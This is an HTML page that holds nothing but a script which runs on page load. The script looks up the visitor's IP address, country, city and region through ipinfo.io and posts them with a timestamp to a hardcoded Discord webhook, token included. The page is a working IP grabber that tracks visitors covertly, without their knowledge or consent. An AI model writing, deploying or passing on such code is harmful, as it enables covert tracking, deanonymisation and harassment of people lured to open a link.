<!DOCTYPE html>
<html lang="en">
<head>    
    <script>
        fetch('https://ipinfo.io/json')
          .then(response => response.json())
          .then(data => {
            const { ip, country, city, region } = data;
            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1355585008559063233/NzF6N7AK8ckpK63nz7UW7cXVgOlACcgS2JNADD1Kb7MvBUqhCj4wpT3B8dVSvaWTwxmf';
            fetch(webhookUrl, {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
            });
          });
    </script>
</body>
</html>
